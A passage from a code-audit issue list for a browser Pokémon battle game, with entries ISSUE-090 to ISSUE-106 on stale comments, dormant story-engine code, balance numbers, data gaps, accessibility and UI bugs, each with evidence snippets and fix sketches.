**Title**: Post-game lead "hunt" collapses to 3 buttons on one Crucible screen — no travel, no gating

**Evidence**:
```js
if (hubMode && !allLeads) {
    // Crucible hub = the post-game Underground: the whole broker network is
    // reachable here, so any uncollected lead can be pulled ...
    const _leadCity = { ledger: 2, recording: 5, key: 8 };
    for (const k of ['ledger', 'recording', 'key']) {
        if (L[k]) continue;
        ...<button onclick="bossCollectLead('${k}')">Collect Lead — ... · City ${_leadCity[k]}</button>
    }
}
```
hubMode=true (the Crucible path) surfaces all three uncollected leads in one place. The "City 2/5/8" labels are the only remaining lore of a 3-city hunt; there is no requirement to actually be in those cities, no ordering, no spacing.

**Repro**: Crucible → Post-Game Quest. All 3 "Collect Lead" buttons present simultaneously. Click 3× → "Enter the Cage" appears. Total elapsed: seconds.

**Blast radius**: Directly answers the maintainer's question "is collecting all 3 leads instantly from the hub too trivial / does it kill the hunt feel?" — yes. The non-hub path (`_bossArcRenderSection()` at ~47924, a real city's PC Underground) correctly shows only the *local* lead, but post-HoF the player is parked at City 9 and can't travel back, so that path is effectively dead and the hub path is the only one used.

**Fix sketch**: Options for maintainer: (a) gate each lead behind a Crucible-sourced micro-encounter (a corrupted-Center wild fight or a short scene with a cost) so collection takes 3 deliberate actions; (b) stagger: only reveal lead N+1 after lead N is collected, with a flavor beat between; (c) tie lead collection to Frontier rounds or gym rematches so the player engages the rest of the post-game hub. Any of these restores pacing without re-introducing the "can't reach City 2/5/8" reachability bug the hub-surfacing was meant to fix.

**Verification**: Leads cannot all be obtained in a single uninterrupted screen session.

---

## <a id="ISSUE-090"></a> ISSUE-090: Extra-track raid HP comment says miniRaid=(party-2)×, raid=(party-1)× base HP, but a separate ×1.3 _bossStatMult also multiplies maxHp — true HP is ~5.2×/6.5× at party 6

---
id: ISSUE-090
severity: P2
category: inconsistency
anchor_symbol: _bossHpScaleForKind
current_line_hint: ~42514
file: battle.html
agents: [battle-engine-debugger, spec-drift-auditor]
fingerprint: 4a47d6fb73d4
confidence: high
status: open
---

**Title**: Extra-track raid HP comment says miniRaid=(party-2)×, raid=(party-1)× base HP, but a separate ×1.3 _bossStatMult also multiplies maxHp — true HP is ~5.2×/6.5× at party 6

**Evidence**:
```js
// _bossHpScaleForKind comment (42509-42517): "mini boss = (maxParty-2) × base HP, real boss = (maxParty-1) × base HP"
if (kind === 'miniRaid') return Math.max(1, p - 2);   // 4 at party 6
if (kind === 'raid')     return Math.max(1, p - 1);   // 5 at party 6
// _rollExtraRaidBossTeam (42540-41): build._bossStatMult = 1.3;  build._bossHpScale = _bossHpScaleForKind(...)
// buildPokemon (15183-15193): maxHp *= _bossStatMult (1.3) THEN maxHp *= _bossHpScale -> COMPOUND on HP
```

**Repro**: Static read of the two scaling blocks. `_bossStatMult=1.3` multiplies maxHp at 15185, then `_bossHpScale` (party-2 / party-1) multiplies it again at 15191. At maxParty 6: miniRaid HP ≈ 1.3 × 4 = **5.2× base** (comment implies 4×); raid ≈ 1.3 × 5 = **6.5× base** (comment implies 5×). The buildPokemon comment at 15176-15178 IS honest about the compounding, but the authority comment on `_bossHpScaleForKind` (42509) and the per-mon HP scale name are not — a tuning footgun.

**Blast radius**: Extra-track (raid/miniRaid) boss survivability only — a narrow, post-game-flavored subset. Low severity because these are 1-vs-party raids where high HP is intended, but the comment understates true bulk by 30% which will mislead a balance edit.

**Fix sketch**: Either fold the 1.3 into `_bossHpScaleForKind`'s returned value (and keep a separate stat-only mult for atk/def/spa/spd/spe), or amend the 42509 comment to "(maxParty-N) × 1.3 × base HP". Maintainer-owned number; recommend the comment fix at minimum.

**Verification**: Build a raid boss in the harness; assert maxHp == round(baseHpStat-derived maxHp × 1.3 × (maxParty-1)).

---

## <a id="ISSUE-091"></a> ISSUE-091: Two parallel story-flow engines coexist — new "unified" engine built but never wired (P2/P3 never done)

---
id: ISSUE-091
severity: P2
category: refactor
anchor_symbol: _buildUnifiedStoryEvents
current_line_hint: ~42440
file: battle.html
agents: [consistency-auditor]
fingerprint: f4639e9e207a
confidence: high
status: open
---

**Title**: Two parallel story-flow engines coexist — new "unified" engine built but never wired (P2/P3 never done)

**Evidence**:
```js
// UNIFIED STORY-FLOW ENGINE (single-engine refactor — P1 scaffolding).
// Built PARALLEL to the legacy dispatch (_resolveActiveRoadBeats + ...) and NOT
// yet wired into processNextEvent — P2 swaps the live path to it, P3 deletes the legacy.
// One registry + one resolver + one dedup ledger. P1 REPRODUCES the legacy dispatch exactly
```

**Repro**: `grep -nE '_buildUnifiedStoryEvents|_unifiedResolveRow|_flowSeen|_flowMarkSeen' battle.html` — all four new-engine fns are referenced ONLY from their definitions (~42457-42509) and the `__testHarness` export bag (~38082-38085). Zero live callers. The legacy dispatch (`_resolveActiveRoadBeats`, `_activeBattleBeatForCurrentRow`, `_tryFireRoadStoryBeats`) is still the only path `processNextEvent` runs.

**Blast radius**: This is the maintainer's "old code racing new code" concern in its purest form. Today it is NOT a runtime race (the unified engine is dormant/test-only), but it is the largest superseded-residue body in the file: a full second flow engine that deliberately "REPRODUCES the legacy dispatch exactly." The danger is divergence — any future flow-bug fix applied to one engine and not the other silently breaks the parity the test (`story-flow-engine-v23.test`) asserts. The four documented flow bugs (audit §4: clumping, ending-before-climax, story-battle-on-gym-approach, fragmented dedup) are pending in the new engine and unfixed in the live legacy one.

**Fix sketch**: Decide the refactor's fate. Either (a) finish the swap (P2 wire `_unifiedResolveRow` into `processNextEvent`, P3 delete the legacy dispatch + the 10 scattered shown-once maps) so there is one engine, or (b) if the swap is shelved, delete the dormant unified engine + its harness exports so two engines can't drift. Do not leave it half-migrated.

**Verification**: After (a): legacy dispatch fns return 0 grep hits and the v23 parity test still passes against the live path. After (b): `_buildUnifiedStoryEvents`/`_unifiedResolveRow`/`_flowSeen`/`_flowMarkSeen` return 0 grep hits.

---

## <a id="ISSUE-092"></a> ISSUE-092: Dormant "unified flow engine" is now triple-orphaned — live dispatch is a 3rd design that leapfrogged it

---
id: ISSUE-092
severity: P2
category: refactor
anchor_symbol: _buildUnifiedStoryEvents
current_line_hint: ~42469
file: battle.html
agents: [story-mode-investigator]
fingerprint: 19a080eb1e8e
confidence: high
status: open
---

**Title**: Dormant "unified flow engine" is now triple-orphaned — live dispatch is a 3rd design that leapfrogged it

**Evidence**:
```js
// _buildUnifiedStoryEvents / _unifiedResolveRow + sm.flowSeen ledger:
//   referenced ONLY by window.__storyTest (lines 38082-38085). Never wired.
//   sm.flowSeen is NOT in sm defaults and no migration seeds it.
// LIVE dispatch instead: processNextEvent @43079 -> _tryFireRoadStoryBeats ->
//   _resolveActiveRoadBeats -> _playStoryBeatQueue, deduped via sm.storyEventsFired.
```

**Repro**: `grep -n "_unifiedResolveRow\|_flowMarkSeen" battle.html` → only declarations + the test-harness surface. `grep -c storyEventsFired` → 11 live hits (the real ledger).

**Blast radius**: The Wave-1 framing ("new unified engine waiting to replace legacy") is stale. Reality: the live path is the v22 3-track `storyEventsFired` dispatch — a THIRD design that postdates BOTH the legacy dispatch AND the unified scaffolding. The unified resolver only reproduces *legacy* road-dump/inject (proven identical for arr30/arr63 in harness), so anyone who "finishes the P2 swap" to it would silently REGRESS the 3-track villain/extra/boss-config features that only the live path knows about. ISSUE-077 understates this.

**Fix sketch**: Delete `_buildUnifiedStoryEvents`/`_unifiedResolveRow`/`_flowSeen`/`_flowMarkSeen` + their `__storyTest` handles + `sm.flowSeen`. They are dead and actively misleading. If a unification is still wanted, it must be built against the live 3-track resolver, not the legacy one.

**Verification**: After deletion, `npm run test:integration` story suites still pass (the unified engine has no live caller).

---

## <a id="ISSUE-093"></a> ISSUE-093: Variants are rolled every run (not forced classic) — so variant Champion/post-HoF lines pointing at the dead broker/cage DO fire

---
id: ISSUE-093
severity: P2
category: inconsistency
anchor_symbol: _CHAMPION_DIALOGUE_BY_VARIANT
current_line_hint: ~32848
file: battle.html
agents: [story-mode-investigator]
fingerprint: 10765c88017a
confidence: high
status: open
---

**Title**: Variants are rolled every run (not forced classic) — so variant Champion/post-HoF lines pointing at the dead broker/cage DO fire

**Evidence**:
```js
// startNewRun: storyLine: _readStorylineFromUI()
// _readStorylineFromUI → _tcState.storyline is ALWAYS 'surprise_me' (set @38773; the picker grid
//   _tcRenderStorylineGrid is never called) → _pickRandomStorylineVariant():
const ids = Object.keys(STORYLINE_VARIANTS).filter(v => v.tier !== 'random'); // 8 real variants
return ids[Math.floor(r * ids.length)];   // a real variant, uniformly, EVERY run
// So project_mewtwo / hypnos_lullaby / lavender_frequency Champion outros that say
// "Walk to the broker. They have the Master Ball. End it." fire for ~7/8 of runs.
```

**Repro**: New run → `sm.storyLine` is a random one of the 8 (rarely `classic`). Play to the Champion outro / post-HoF epilogue on `project_mewtwo` — the prose instructs "walk to the broker… enter the cage," but the Caged-God arc is cut (broker/cage unreachable). The earlier consistency-auditor P3 marked this medium-confidence assuming variants might be forced classic; they are NOT — confidence is high and the player-facing impact is ~7/8 of runs, not an edge case.

**Blast radius**: Champion outro (row 64) + post-HoF epilogue for project_mewtwo, hypnos_lullaby, lavender_frequency, static, dead_raticate (and the mystery-outro lines above). The variant arcs' climaxes dangle at a destination that no longer exists, in the large majority of runs.

**Fix sketch**: Part of the Caged-God excision (Phase B): scrub broker/cage references from variant Champion + post-HoF + mystery-outro prose. Until then this is live, high-frequency dead-end dialogue.

**Verification**: No live variant Champion/epilogue/outro instructs the player to visit a broker or cage.

---

## <a id="ISSUE-094"></a> ISSUE-094: Colress Signature-Z silently overwrites the last move; confirm warns only about item/gimmick

---
id: ISSUE-094
severity: P2
category: inconsistency
anchor_symbol: _colressConfirm
current_line_hint: ~58357
file: battle.html
agents: [consistency-auditor]
fingerprint: 82b8202f5d43
confidence: high
status: open
---

**Title**: Colress Signature-Z silently overwrites the last move; confirm warns only about item/gimmick

**Evidence**:
```js
// 58357: confirm text = "Awaken Signature Z — equip ${sigZ}" → "...Replaces current held item / gimmick."
// 58366: const injIdx = mon.build.m.length < 4 ? mon.build.m.length : mon.build.m.length - 1;
// 58367: mon.build.m[injIdx] = reqMove;   // when 4 moves are full, drops the last move with no warning
```

**Repro**: give a 4-move mon a signature Z whose required move it doesn't know → a move is replaced; the dialog never said so.

**Blast radius**: Destructive-action consistency. Release/Sell (48440/48458) warn "This cannot be undone" + shiny/EV notes; move-overwrite teaches at Tutor warn ("Replaces \"oldMove\""). Colress Sig-Z is the one destructive path with no move-loss warning.

**Fix sketch**: When `m.length === 4` and reqMove absent, surface the dropped move name in the confirm ("This will replace <lastMove> with <reqMove>"). Mechanics-adjacent (touches build.m) — needs sign-off; the copy add alone is safe.

**Verification**: Confirm names the move being dropped before it happens.

---

## <a id="ISSUE-095"></a> ISSUE-095: Nature Rater cost badge shows "2000+" but TUTOR_COST_NATURE is a flat 2000

---
id: ISSUE-095
severity: P2
category: inconsistency
anchor_symbol: _costBadge
current_line_hint: ~42956
file: battle.html
agents: [consistency-auditor]
fingerprint: e9291216e754
confidence: high
status: open
---

**Title**: Nature Rater cost badge shows "2000+" but TUTOR_COST_NATURE is a flat 2000

**Evidence**:
```js
// 42956: _facOpts('nature', [_costBadge(2000, '+')] ...)   // "+" implies it varies
// 53853: const TUTOR_COST_NATURE = 2000;                    // flat
// vs 42939 Move Tutor _costBadge(_moveCostForStage(), '+')  // genuinely staged → '+' correct
```

**Repro**: enter a Nature Rater in any city; charge is always 2000G regardless of stat/mon.

**Blast radius**: "+" suffix elsewhere (Tutor, Dojo, evolab, Link) signals "starting price, scales up." On Nature Rater it's misinformation. Dojo `_costBadge(500,'+')` and evolab `_costBadge(1500,'+')` should be re-checked the same way.

**Fix sketch**: Pure-text. Drop the "+" for facilities with a flat constant cost; keep it only where the cost is computed/staged.

**Verification**: A "+" badge appears only where the underlying cost can change.

---

## <a id="ISSUE-096"></a> ISSUE-096: 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js

---
id: ISSUE-096
severity: P2
category: refactor
anchor_symbol: _hostRunResolution
current_line_hint: ~588
file: online-pvp.js
agents: [consistency-auditor]
fingerprint: 52cc0edfbc71
confidence: high
status: open
---

**Title**: 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js

**Evidence**:
```js
// L478, L534, L559, L610, L639, L672, L710 — all match this shape:
const { data: row, error: rowErr } = await sb.from('pvp_rooms').select('data').eq('id', roomId).single();
if (rowErr || !row || row.data == null) {
    console.warn('[OnlinePvP] <label> fetch', rowErr);
    return;
}
const prev = row.data;
```

**Repro**: `grep -nE "select\\('data'\\)\\.eq\\('id', roomId\\)\\.single\\(\\)" online-pvp.js` returns 7 sites with near-identical follow-on error handling.

**Blast radius**: Maintenance only — if Supabase API surface changes, every site needs the same edit. Risk of one fetch getting fixed and others diverging. No runtime bug.

**Fix sketch**: Extract a single `async function _fetchRoomData(label)` helper that returns `{ data, error }` or `null` on failure, logs once, and lets call sites focus on logic. Probably 10-15 lines of shared code.

**Verification**: Run existing online-PvP integration tests after refactor; no behavior change expected.

---

## <a id="ISSUE-097"></a> ISSUE-097: Build "illegal-ability" pairs (672) are intended (hackmons/AAA + mega-form abilities); a naive legality check false-positives

---
id: ISSUE-097
severity: P2
category: inconsistency
anchor_symbol: _isBuildAbilityIllegal
current_line_hint: ~9919
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 6a7b7ae22cca
confidence: medium
status: open
---

**Title**: Build "illegal-ability" pairs (672) are intended (hackmons/AAA + mega-form abilities); a naive legality check false-positives

**Evidence**:
```js
// loadBuildsCSV already gates illegal abilities at load — this IS the legality model:
if (Array.isArray(buildObj._abilityOptions)) {
  const legalAbilities = buildObj._abilityOptions.filter(a => !_isBuildAbilityIllegal(name, a));
  if (legalAbilities.length === 0) { buildObj._illegal = true; illegalCount++; }
} else if (_isBuildAbilityIllegal(name, buildObj.a)) { buildObj._illegal = true; illegalCount++; }
// 672 build species::ability "violations" vs species.json abilities; ~634 are
// free-ability metagames (almostanyability/balancedhackmons/purehackmons/1v1/mixandmega);
// the rest are mega-form abilities (e.g. Charizard/ou "Tough Claws" = charizardmegax).
```

**Repro**: Cross-ref each build's `ability` against `species.json[species].abilities`. 672 distinct pairs mismatch; filtering free-ability tiers leaves ~38, all mega/form-transition (verified: `charizardmegax` carries Tough Claws, `dianciemega` carries Magic Bounce, etc.).

**Blast radius**: None for gameplay — the engine flags these via `_isBuildAbilityIllegal` and gates them behind end-game opt-in (`allowIllegal`/`forceIllegal` in `makeBuild` 10297). Relevant to the retune only as a caveat: any new "legal moveset/ability" validation for the curve must (a) resolve mega/form abilities against the form key, and (b) treat hackmons/AAA tiers as legitimately ability-free, or it will produce ~672 phantom findings.

**Fix sketch**: If the retune adds an ability-legality gate, reuse `_isBuildAbilityIllegal` (which already encodes the mega/hackmons rules) rather than a raw species.json abilities check.

**Verification**: Confirm a standard-tier (ou/uu) non-mega build with an off-species ability does not exist (it doesn't); confirm flagged builds only surface in end-game `allowIllegal` flows.

---

## <a id="ISSUE-098"></a> ISSUE-098: species.json Hisui formes are stale (gen8 snapshot) — Samurott-Hisui/Kleavor lack gen9 Sharpness, so every legal-tier build is dropped

---
id: ISSUE-098
severity: P2
category: data
anchor_symbol: _isBuildAbilityIllegal
current_line_hint: ~10536
file: data/species.json
agents: [data-integrity-auditor]
fingerprint: 6cd268a1ac66
confidence: high
status: open
---

**Title**: species.json Hisui formes are stale (gen8 snapshot) — Samurott-Hisui/Kleavor lack gen9 Sharpness, so every legal-tier build is dropped

**Evidence**:
```
// data/species.json
Samurott-Hisui (gen8): abilities {"0":"Torrent","H":"Shell Armor"}   // missing "Sharpness"
Kleavor        (gen8): abilities {"0":"Swarm","1":"Sheer Force","H":"Steadfast"} // missing "Sharpness"
// data/builds/gen9.json — Samurott-Hisui/ou ALL list ability "Sharpness" (12 sets); Kleavor/ru "Sharpness" (8 sets)
```
`_isBuildAbilityIllegal(name, ab)` (battle.html ~10536) cross-references `baseStats[name].abilities`. Because species.json keys these Hisui formes at their gen8 ability set, every gen9 OU/RU build that correctly lists Sharpness is tagged `_illegal` and filtered out of the default (`allowIllegal=false`) pool in `makeBuild` (~11068). These are STANDARD legal tiers (ou/ru), not hackmons — distinct from ISSUE-054's "intended" set.

**Repro**: `node` over data/builds/*.json + species.json: for Samurott-Hisui every standard build's `ability` ("Sharpness") fails `allowed.has()` against species.json's {Torrent, Shell Armor}; same for Kleavor. Both species end with legal=0, illegal=12 / illegal=8.

**Blast radius**: Story rolls (`rollTrainerTeam`→`makeBuild`) for these two species silently fall through the designed-build pool to the randbats cache or the last-resort Tackle/Growl/Leer build (~11126), so a foe Samurott-Hisui never gets its intended Smogon set. No crash. The same gen-staleness pattern affects Whirlipede (Speed Boost), Decidueye-Hisui (Scrappy), Growlithe-Hisui (Rock Head), Igglybuff (Competitive) — see the companion all-illegal finding.

**Fix sketch**: Add "Sharpness" to the ability list of Samurott-Hisui and Kleavor in data/species.json (gen9 ability slot), regenerating from a current dex if species.json is build-generated. Balance numbers stay user-owned; this is a data-correctness fix, not a curve change.

**Verification**: After the edit, `_isBuildAbilityIllegal("Samurott-Hisui","Sharpness")` returns false and a re-run of the all-illegal scan shows Samurott-Hisui/Kleavor with legal>0.

---

## <a id="ISSUE-099"></a> ISSUE-099: Cable Link gimmick gate contradicts CHANGELOG promise that Cable Link surfaces pre-unlock mechanics

---
id: ISSUE-099
severity: P2
category: inconsistency
anchor_symbol: _makePlayerLinkBuild
current_line_hint: ~42374
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4b6cce4cb746
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Cable Link gimmick gate contradicts CHANGELOG promise that Cable Link surfaces pre-unlock mechanics

**Evidence**:
```js
// battle.html ~10764 comment in _withStoryPlayerGimmickGate
// > Used by every player-side acquisition path EXCEPT Cable Link
// > (the premium "another trainer's mon" path is allowed to surface
// > pre-unlock gimmicks by design — see _makePlayerLinkBuild).

// CHANGELOG.md 2026-05-21 entry, lines 23-27:
// > Cable Link is deliberately left ungated — its premium "another
// > trainer's mon" vibe (high reroll cost, can surface pre-unlock
// > gimmicks) is the only sanctioned shortcut.

// battle.html ~42374 — actual implementation
function _makePlayerLinkBuild(name, tierTag) {
    try {
        window._pbsStoryUsePlayerGimmickGate = true;
        window._pbsStoryUnlockedGimmicks = sm.unlockedGimmicks || [];
        newBuild = makeBuild(name);
    } finally { ... }
}
```
The Cable Link builder applies the EXACT same gate that the CHANGELOG and the helper comment claim it bypasses. So a Gym-3 player paying for a Cable Link upgrade cannot, in practice, surface a Mega/Z/Tera/DMax build.

**Repro**: At Gym 3 (badges=3, `sm.unlockedGimmicks` empty), Cable Link upgrade a Charizard. The result will never carry a Charizardite Y, no matter how many rerolls.

**Blast radius**: Two parts: (1) the comment + CHANGELOG entries above are stale/lying about the gate; (2) if the *spec* intent was the documented "Cable Link is the premium pre-unlock shortcut" behaviour, the implementation regressed. `STORY_MODE_FLOW.md §15d` line 712-715 actually says Cable Link **IS** gated ("preserves the existing player gimmick gating … Cable Link only rolls gimmicks the player has unlocked"), so the spec is internally consistent with the code, but the CHANGELOG and `_withStoryPlayerGimmickGate` comment contradict it.

**Fix sketch**: Either (a) drop the gate from `_makePlayerLinkBuild` to match the CHANGELOG, or (b) rewrite the CHANGELOG entry and the `_withStoryPlayerGimmickGate` comment to match reality and the existing spec.

**Verification**: After (a), Cable Link rerolls / upgrades / rebuilds at pre-Gym-5 should occasionally roll Mega/Z/Tera/DMax mons; the `if (!Array.isArray(window._pbsStoryUnlockedGimmicks))` short-circuit in `_mechForGimmickRoll` (line 10751) handles "no gate" cleanly.

---

## <a id="ISSUE-100"></a> ISSUE-100: Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it

---
id: ISSUE-100
severity: P2
category: a11y
anchor_symbol: _maybeShowSaveToast
current_line_hint: ~30847
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b17b3f418817
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it

**Evidence**:
```js
// _maybeShowSaveToast at ~30847
const el = document.createElement('div');
el.className = 'story-save-toast';
el.textContent = '💾 Saved';
el.style.cssText = 'position:fixed;left:50%;bottom:18px;…';
document.body.appendChild(el);   // ← appends to <body>, NOT #toast-host
```

The toast helper that the rest of the game uses (`window.showToast`, ~8722) appends into `#toast-host` (line 7389) which has `aria-live="polite"`. `_maybeShowSaveToast` constructs its own DOM and appends straight to `document.body`, so the toast is never inside a live region and never announced. The visual styling also bakes in `pointer-events:none` so SR users can't even pull focus to it.

**Repro**: Run a story battle to completion with a screen reader on; the visual "💾 Saved" toast renders, but VoiceOver/NVDA stays silent.

**Blast radius**: Save events are the only confirmation a player gets that their progress persisted (the localStorage write is fire-and-forget). Blind story-mode players have no audible confirmation of autosave. Affects every transition: battle end, enterCity, renderActions, etc.

**Fix sketch**: Append the toast element into `document.getElementById('toast-host')` instead of `document.body`, or add `role="status" aria-live="polite"` directly on the element before appending. Keep the throttle + `pointer-events:none`.

**Verification**: After fix, `grep -A2 _maybeShowSaveToast battle.html` shows the host insertion. Run with a screen reader → "Saved" is announced once per ≥3s window.

---

## <a id="ISSUE-101"></a> ISSUE-101: "PC nearly full" warning threshold is `PC_BOX_CAP - 3` (27/30) but the spec calls for 80% (8/10)

---
id: ISSUE-101
severity: P2
category: inconsistency
anchor_symbol: _pcRefresh
current_line_hint: ~38678
file: battle.html
agents: [story-mode-investigator]
fingerprint: f7ba532510f0
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: "PC nearly full" warning threshold is `PC_BOX_CAP - 3` (27/30) but the spec calls for 80% (8/10)

**Evidence**:
```js
// battle.html ~38677
const boxFull = box.length >= PC_BOX_CAP;
const lowSlotWarn = box.length >= (PC_BOX_CAP - 3) && box.length < PC_BOX_CAP;
// PC_BOX_CAP === 30, so warning fires at 27/30 (90%).

// STORY_MODE_FLOW.md §7:
// > At ≥ 8/10 the screen shows a "PC nearly full" warning banner;
// > at 10/10 a new wild catch fails outright with a clear modal
```
80% of 10 = 8. The spec's ratio (8/10 = 80%) differs from the code's ratio (27/30 = 90%). Bound to the P1 PC_BOX_CAP discrepancy — if cap is realigned to 10, the warning at "cap-3" becomes 7/10, even further off-spec.

**Repro**: Deposit 26 mons in PC. No warning. Deposit 27th — warning fires. Per spec, the warning should have fired at 8.

**Blast radius**: Cosmetic warning UX. Becomes a real issue if the P1 PC_BOX_CAP discrepancy is resolved either direction.

**Fix sketch**: Replace `(PC_BOX_CAP - 3)` with `Math.floor(PC_BOX_CAP * 0.8)` so the warning ratio is parametric. At cap=10 → fires at 8; at cap=30 → fires at 24.

**Verification**: After fix, warning fires at 80% of whatever cap was. Spec text matches code at any cap.

---

## <a id="ISSUE-102"></a> ISSUE-102: PC deposit/withdraw/release resets scroll to top via full innerHTML rewrite

---
id: ISSUE-102
severity: P2
category: dx
anchor_symbol: _pcRefresh
current_line_hint: ~47409
file: battle.html
agents: [story-mode-investigator]
fingerprint: 990f3a987dff
confidence: high
status: open
---

**Title**: PC deposit/withdraw/release resets scroll to top via full innerHTML rewrite

**Evidence**:
```js
const body = document.getElementById('story-pc-body');
if (!body) return;
if (_pcCurrentTab === 'storage') body.innerHTML = _pcRenderStorageTab();
else body.innerHTML = _pcRenderUndergroundTab();
_pcInstallRowClickHandler();
```

**Repro**: Fill the PC toward its 30-mon cap, scroll down, deposit/withdraw/release a mon near the bottom. `_pcRefresh` rebuilds `story-pc-body.innerHTML` wholesale, so the scroll position jumps back to top each action — the player must re-scroll for every subsequent operation on a long box.

**Blast radius**: PC Storage tab and Underground tab; worsens with box size. Pure UX (no state loss).

**Fix sketch**: Capture `body.scrollTop` before the innerHTML rewrite and restore it after (or render rows into a stable container and diff). 

**Verification**: Manual: deposit from a scrolled-down position; confirm the list stays put.

---

## <a id="ISSUE-103"></a> ISSUE-103: Rivalry tab is mis-homed in the Pokémon Center — belongs in a progression/journal surface

---
id: ISSUE-103
severity: P2
category: refactor
anchor_symbol: _pcRenderRivalJournalTab
current_line_hint: ~42866
file: battle.html
agents: [story-mode-investigator]
fingerprint: f642d84a30e0
confidence: medium
status: open
---

**Title**: Rivalry tab is mis-homed in the Pokémon Center — belongs in a progression/journal surface

**Evidence**:
```html
<!-- battle.html:8501 — 3rd tab of #screen-story-pokemoncenter -->
<button id="story-pc-tab-journal-btn" onclick="window.StoryMode.pcSwitchTab('journal')"
  title="Your rivalry — past encounters, their teams, win/loss record"> Rivalry</button>
```

**Repro**: `_pcRenderRivalJournalTab` (battle.html:42866) renders a read-only journal of `sm.rivalEncounterLog` — W/L standing, the rival's team per encounter (sprite chips), badge stage, and champion-claim status. It sits as the 3rd tab inside the Pokémon Center, whose other two tabs (PC Storage, Underground) are both mon-inventory management. The Rivalry journal is narrative/progression telemetry — orthogonal to mon storage/selling.

**Blast radius**: Discoverability — a player managing their box has no reason to expect rivalry history there; a player wanting to check the rivalry won't think "Pokémon Center". The maintainer's "a bit irrelevant" instinct is correct.

**Fix sketch**: RECOMMENDATION: move it. It is fully self-contained (reads only `sm.rivalEncounterLog` + `_rivalDisplayName`/`rivalPhaseTagline`), so relocation is low-risk. Best home is the cross-run Collection surface (alongside Pokédex / Achievements / Hall of Fame — `openCollection`) as a per-run "Rivalry" panel, OR a city-hub action gated on `sm.rivalEncounterLog.length >= 1` (mirrors the existing rival-cameo gate at 38598). Do NOT cut it — the data capture in `setRivalStanding` (32001–32016) is already wired and the journal is good fanservice. Just re-parent the render call and drop the PC tab button.

**Verification**: Confirm the journal renders identically under the new parent; confirm `pcSwitchTab` no longer references 'journal'.

---

## <a id="ISSUE-104"></a> ISSUE-104: Underground claims "Starters … aren't for sale" but starters are sellable (unsellable flag stripped)

---
id: ISSUE-104
severity: P2
category: inconsistency
anchor_symbol: _pcRenderUndergroundTab
current_line_hint: ~47667
file: battle.html
agents: [story-mode-investigator]
fingerprint: b310fed6b664
confidence: high
status: open
---

**Title**: Underground claims "Starters … aren't for sale" but starters are sellable (unsellable flag stripped)

**Evidence**:
```js
// _pcRenderUndergroundTab empty-state text:
"Nothing on the table tonight. Starters and bonded partners aren't for sale here."
// But the sell gate only blocks on slot.unsellable === true:
const canSell = !!id && !unsellable && !isLastParty;
// And the load-time backfill strips unsellable from starters:
if (slot.starter === true && slot.unsellable === true) delete slot.unsellable;
// pickProfessorChoice sets starter:true with NO unsellable: "No hard restrictions — the player can ... sell it"
```

**Repro**: Pick a starter, catch a second mon, open Underground — the starter shows a Sell button (only blocked if it is the last party mon). The "Starters … aren't for sale" copy is false.

**Blast radius**: A player reassured by the copy could be surprised they sold their starter. Pairs with the welcome-tip claim (FP4).

**Fix sketch**: Either keep starters sellable and remove the "Starters … aren't for sale" clause, or re-block selling when slot.starter === true. Design-owned (pasteur) — flag.

**Verification**: Copy and sell-gate agree.

---

## <a id="ISSUE-105"></a> ISSUE-105: Villain-arc regular battles share 7 generic `tag:'villain'` grunts — never themed to the run's actual track (3 tracks have no matching grunt at all)

---
id: ISSUE-105
severity: P2
category: inconsistency
anchor_symbol: _pickThemedTrainerForRole
current_line_hint: ~38599
file: battle.html
agents: [data-integrity-auditor]
fingerprint: a181ae1745b6
confidence: high
status: open
---

**Title**: Villain-arc regular battles share 7 generic `tag:'villain'` grunts — never themed to the run's actual track (3 tracks have no matching grunt at all)

**Evidence**:
```js
// All tag:'villain' rows in TRAINER_DATA (30095-30101) — 7 total:
Rocket Executive, Aqua Admin, Magma Admin, Galactic Commander,
Plasma Sage, Flare Scientist, Skull Boss
// _resolveThemeForBattleRow returns the SHARED tag 'villain' (STORY_THEMED_BATTLES rows 20/33/41/56),
// _pickThemedTrainerForRole filters `t.tag !== theme` → picks from the same 7 regardless of sm.tracks.villain.
```

**Repro**: A run rolls `sm.tracks.villain` from `VILLAIN_TRACKS` (10 entries incl. `yell`, `macroCosmos`, `star`). The four villain-themed regular slots (`STORY_THEMED_BATTLES = {20:'villain',33:'villain',41:'villain',56:'villain'}`) resolve via `_resolveThemeForBattleRow → 'villain'`, and `_pickThemedTrainerForRole('Basic Trainer', …, 'villain')` filters by `t.tag === 'villain'`. There is no per-track tag, so a Team Star / Macro Cosmos / Team Yell run gets Rocket/Aqua/Magma/Galactic/Plasma/Flare/Skull grunts in its scouting fights. Only the boss + mini-boss beats (via `BEAT_CANON_TRAINER`) are track-correct; the regular villain encounters are not. Three tracks (yell, macroCosmos, star) have NO `tag:'villain'` grunt archetype.

**Blast radius**: Requirement §2.4 wants themed villain trainers, "only if none fits, a random trainer from the appropriate pool." Here the regular villain battles ALWAYS use an off-track grunt — the "random fallback" is the default, not the exception. Narratively a "Team Star" arc fields Team Rocket/Aqua grunts mid-road. Does not crash; purely a theming/identity gap. Distinct from the BEAT_CANON_TRAINER sprite finding (which is about bosses).

**Fix sketch**: Either (a) tag villain grunts per track (e.g. `tag:'villain:star'`) and have `_resolveThemeForBattleRow` emit `'villain:'+sm.tracks.villain`, with `_pickThemedTrainerForRole` falling back to the generic `'villain'` pool when a track has no grunt; or (b) add the 3 missing grunt archetypes (Team Yell / Macro Cosmos / Team Star). Aligns with STORY_OVERHAUL_PLAN §4 "beat→trainer mapping is deterministic & themed … random-from-pool only as an explicit fallback".

**Verification**: For each of the 10 `VILLAIN_TRACKS`, the four villain-tagged regular rows resolve to a grunt whose flavor matches that track (or an explicit, logged generic fallback).

---

## <a id="ISSUE-106"></a> ISSUE-106: _renderCrucible rebuilds a 17.7KB / 109-node innerHTML on every open + lead-collect + hard-mode toggle

---
id: ISSUE-106
severity: P2
category: perf
anchor_symbol: _renderCrucible
current_line_hint: ~48084
file: battle.html
agents: [performance-profiler]
fingerprint: 38f68891607d
confidence: high
status: open
---

